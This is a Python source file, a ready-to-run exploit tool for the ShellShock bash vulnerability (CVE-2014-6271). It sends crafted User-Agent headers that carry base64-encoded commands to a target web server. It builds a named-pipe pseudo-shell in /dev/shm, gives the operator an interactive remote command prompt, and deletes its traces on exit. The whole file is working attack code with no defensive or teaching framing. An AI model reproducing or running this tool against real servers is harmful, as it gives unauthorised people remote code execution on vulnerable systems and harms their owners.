import requests
import argparse
import base64
import threading
import time

class Shocker:
    def __init__(self,target):
        self.target = target
        self.input = "/dev/shm/input"
        self.output = "/dev/shm/output"
        self.logo()
        self.url = self.url_fix()
        self.makefifo()

        self.thread = threading.Thread(target=self.readoutput, args=())
        self.thread.daemon = True
        self.thread.start()

        self.write_cmd()
        

    def logo(self):
        display = "Welcome to ShellShock!\n"
        display += "                         __________\n"
        display += "                      .~#########%;~.\n"
        display += "                     /############%;`\n"
        display += "                    /######/~\/~\%;,;,\n"
        display += "                   |#######\    /;;;;.,.|\n"
        display += "                   |#########\/%;;;;;.,.|\n"
        display += "          XX       |##/~~\####%;;;/~~\;,|       XX\n"
        display += "        XX..X      |#|  o  \##%;/  o  |.|      X..XX\n"
        display += "      XX.....X     |##\____/##%;\____/.,|     X.....XX\n"
        display += " XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX\n"
        display += "X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X\n"
        display += "X |.....X  @#%,.@     |######%;;;;,.|     @#%,.@  X.....| X\n"
        display += "X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X\n"
        display += " X# \.X        @#%,.@                  @#%,.@        X./  #\n"
        display += "##  X          @#%,.@              @#%,.@          X   #\n"
        display += ", # #X            @#%,.@          @#%,.@            X ##\n"
        display += "   `###X             @#%,.@      @#%,.@             ####'\n"
        display += "  . ' ###              @#%.,@  @#%,.@              ###`\n"
        display += "    . ;                @#%.@#%,.@                ;` ' .\n"
        display += "      '                    @#%,.@                   ,.\n"
        display += "      ` ,                @#%,.@  @@                `\n"
        display += "                          @@@  @@@  \n"
        print(display)

    def url_fix(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def base64encode(self,string):
        string_bytes = string.encode("ascii")
        base64_bytes = base64.b64encode(string_bytes)
        base64_string = base64_bytes.decode("ascii")

        return base64_string

    def makefifo(self):
        make_fifo = "mkfifo " + self.input + "; tail -f " + self.input + " | /bin/sh 2>&1 > " + self.output
        make_fifo_encoded = self.base64encode(make_fifo)
        self.shellshock(make_fifo_encoded)

    def shellshock(self,cmd):
        requests.packages.urllib3.disable_warnings()
        payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"        
        useragent = {"User-Agent": payload}

        try:
            req_site = requests.get(self.url, headers=useragent, verify=False,timeout=1)
            return req_site.text.strip()
        except:
            pass

    def readoutput(self):
        read_file = "/bin/cat " + self.output
        read_file_encoded = self.base64encode(read_file)
        while True:
            output = self.shellshock(read_file_encoded) 
            if output:
                print(output)
                clear_file = "echo -n '' > " + self.output
                clear_file_encoded = self.base64encode(clear_file)
                self.shellshock(clear_file_encoded)
            time.sleep(1)

    def write_cmd(self):
        requests.packages.urllib3.disable_warnings()
        while True:
            try:
                rce = input("RCE: ")
                rce = rce + "\n"
                rce_encoded = self.base64encode(rce)
                payload = "() { :;}; echo; /bin/bash -c 'echo " + rce_encoded + " | base64 -d > " + self.input + "'" 
                useragent = {"User-Agent": payload}
                requests.get(self.url, headers=useragent, verify=False)
                time.sleep(2.5)

            except KeyboardInterrupt:
                remove_files = "rm " + self.input + ";rm " + self.output
                remove_files_encoded = self.base64encode(remove_files)
                self.shellshock(remove_files_encoded)
                print("\nBye Bye!")
                exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='CVE 2014-6271 - ShellShock Remote Code Execution')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://shock.me/', required=True)
    args = parser.parse_args()
    
    Shocker(args.t)